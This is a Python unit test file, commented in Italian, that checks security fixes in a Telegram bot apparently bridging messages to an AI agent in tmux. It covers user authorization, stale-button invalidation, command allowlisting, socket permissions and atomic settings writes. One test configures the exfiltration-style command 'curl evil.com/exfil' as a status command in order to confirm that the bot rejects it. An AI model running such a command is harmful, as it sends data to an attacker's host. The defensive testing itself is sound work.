"""
Security and Concurrency Audit Unit Tests for agy-telegram.
Verifies fixes for P0 blockers, P1 criticals, and P2 architectural requirements.
"""

import asyncio
import os
import tempfile
import unittest
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

from agy_telegram.config import AppConfig, TelegramConfig, AgentConfig, SentinelConfig, MirrorConfig
from agy_telegram.core.bot import AgyTelegramBot, TurnContext
from agy_telegram.core.formatter import split_text
from agy_telegram.core.settings_manager import set_current_model, get_current_model, set_current_mode, get_current_mode
from agy_telegram.sentinel.server import SentinelServer


def make_dummy_config(allowed_user_id: int = 12345, status_command: str = None) -> AppConfig:
    return AppConfig(
        telegram=TelegramConfig(bot_token="123456:dummy_token", allowed_users=[allowed_user_id]),
        agent=AgentConfig(status_command=status_command),
        sentinel=SentinelConfig(enabled=False),
        mirror=MirrorConfig(mode="tmux", target_session="test:0.0"),
    )


class TestSecurityAudit(unittest.TestCase):
    def test_unauthorized_callback_rejected(self):
        """Verifica che un callback da utente non autorizzato venga rifiutato."""
        bot = AgyTelegramBot(make_dummy_config(allowed_user_id=12345))

        mock_update = MagicMock()
        mock_update.effective_user.id = 99999  # Non autorizzato
        mock_query = MagicMock()
        mock_query.data = "tmux_key:1:turn123"
        mock_query.answer = AsyncMock()
        mock_update.callback_query = mock_query

        # Mock per tmux_mirror
        bot.tmux_mirror.send_raw_key = AsyncMock()

        asyncio.run(bot.handle_callback(mock_update, MagicMock()))

        # send_raw_key NON deve mai essere stato chiamato
        self.assertFalse(bot.tmux_mirror.send_raw_key.called, "Un utente non autorizzato non deve poter inviare tasti a tmux!")
        # Deve aver risposto con alert di diniego
        self.assertTrue(mock_query.answer.called)
        self.assertIn("non autorizzato", mock_query.answer.call_args[0][0])

    def test_stale_turn_callback_invalidation(self):
        """Verifica che i bottoni inline di turni precedenti vengano invalidati."""
        bot = AgyTelegramBot(make_dummy_config(allowed_user_id=12345))

        # Turno attivo corrente
        current_turn = TurnContext(
            turn_id="current_id",
            user_id=12345,
            chat_id=12345,
            is_prompt_active=True,
        )
        bot.active_turns[12345] = current_turn
        bot.tmux_mirror.send_raw_key = AsyncMock()

        mock_update = MagicMock()
        mock_update.effective_user.id = 12345
        mock_query = MagicMock()
        # Callback proveniente da un turno precedente ("old_id" != "current_id")
        mock_query.data = "tmux_key:1:old_id"
        mock_query.answer = AsyncMock()
        mock_query.edit_message_text = AsyncMock()
        mock_update.callback_query = mock_query

        asyncio.run(bot.handle_callback(mock_update, MagicMock()))

        # Nessun tasto inviato a tmux
        self.assertFalse(bot.tmux_mirror.send_raw_key.called, "I bottoni stale di turni precedenti non devono inviare tasti!")
        # Deve aver notificato che il turno è scaduto
        self.assertTrue(mock_query.edit_message_text.called)
        self.assertIn("scaduta", mock_query.edit_message_text.call_args[0][0])

    def test_quick_action_no_substring_hijack(self):
        """Verifica che frasi con parole chiave non attivino i comandi da tastiera."""
        bot = AgyTelegramBot(make_dummy_config(allowed_user_id=12345))
        bot.cmd_new = AsyncMock()
        bot.cmd_abort = AsyncMock()
        bot.cmd_status = AsyncMock()

        # Mock per tmux_mirror e invio input
        bot.tmux_mirror.check_session_exists = AsyncMock(return_value=True)
        bot.tmux_mirror.send_input = AsyncMock(return_value=True)
        bot.tmux_mirror.start_turn_monitoring = AsyncMock()

        mock_update = MagicMock()
        mock_update.effective_user.id = 12345
        mock_update.effective_chat.id = 12345
        mock_update.effective_message.reply_text = AsyncMock()
        mock_update.effective_chat.send_action = AsyncMock()

        # Messaggio discorsivo contenente "New"
        mock_update.effective_message.text = "What is the New feature in Python 3.12?"

        asyncio.run(bot.handle_message(mock_update, MagicMock()))

        # Non deve aver chiamato cmd_new!
        self.assertFalse(bot.cmd_new.called, "Un messaggio discorsivo contenente 'New' non deve invocare cmd_new!")
        # Deve aver inoltrato il testo a tmux
        self.assertTrue(bot.tmux_mirror.send_input.called)
        self.assertEqual(bot.tmux_mirror.send_input.call_args[0][0], "What is the New feature in Python 3.12?")

    def test_cmd_status_allowlist_enforcement(self):
        """Verifica che cmd_status rifiuti comandi al di fuori della allowlist."""
        # Configurazione con comando malevolo/non consentito
        config = make_dummy_config(allowed_user_id=12345, status_command="curl evil.com/exfil")
        bot = AgyTelegramBot(config)
        bot.reply_safe = AsyncMock()

        mock_update = MagicMock()
        mock_update.effective_user.id = 12345
        mock_update.effective_chat.send_action = AsyncMock()

        asyncio.run(bot.cmd_status(mock_update, MagicMock()))

        # Deve aver rifiutato l'esecuzione
        self.assertTrue(bot.reply_safe.called)
        reply_text = bot.reply_safe.call_args[0][1]
        self.assertIn("non autorizzato", reply_text)
        self.assertIn("curl", reply_text)

    def test_sentinel_socket_permissions_and_creation(self):
        """Verifica che il socket UNIX sia creato con permessi restrittivi 0o600."""
        with tempfile.TemporaryDirectory() as tmpdir:
            sock_path = os.path.join(tmpdir, "test-sentinel.sock")
            server = SentinelServer(socket_path=sock_path)

            async def run_server():
                await server.start()
                self.assertTrue(os.path.exists(sock_path))
                # Verifica permessi file
                mode = os.stat(sock_path).st_mode & 0o777
                self.assertEqual(mode, 0o600, "Il socket UNIX deve avere permessi restrittivi 0o600!")
                await server.stop()

            asyncio.run(run_server())

    def test_split_text_balanced_html(self):
        """Verifica che split_text bilanci i tag pre/code tra chunk consecutivi."""
        code_body = "x = 42\n" * 400  # Circa 2800 caratteri
        long_html = f'<pre class="language-python"><code>{code_body}\n{code_body}</code></pre>'

        chunks = split_text(long_html, max_chunk=2000)
        self.assertGreater(len(chunks), 1, "Il testo deve essere diviso in più chunk.")

        # Il primo chunk deve chiudere i tag pre/code
        self.assertTrue(chunks[0].endswith("</code></pre>"), "Il primo chunk deve terminare con </code></pre>")
        # Il secondo chunk deve riaprire pre/code
        self.assertTrue(chunks[1].startswith('<pre class="language-python"><code>'), "Il chunk successivo deve riaprire <pre><code>")

    def test_atomic_settings_update(self):
        """Verifica che l'aggiornamento di settings.json sia atomico."""
        with tempfile.TemporaryDirectory() as tmpdir:
            test_settings = Path(tmpdir) / "settings.json"
            with patch("agy_telegram.core.settings_manager.resolve_settings_path", return_value=test_settings):
                ok1 = set_current_model("Claude Sonnet 4.6 (Thinking)")
                self.assertTrue(ok1)
                self.assertEqual(get_current_model(), "Claude Sonnet 4.6 (Thinking)")

                ok2 = set_current_mode("accept-edits")
                self.assertTrue(ok2)
                self.assertEqual(get_current_mode(), "accept-edits")

                # Verifica che entrambi i campi siano presenti nel file JSON finale
                import json
                with open(test_settings, "r", encoding="utf-8") as f:
                    data = json.load(f)
                self.assertEqual(data["model"], "Claude Sonnet 4.6 (Thinking)")
                self.assertEqual(data["mode"], "accept-edits")


if __name__ == "__main__":
    unittest.main()
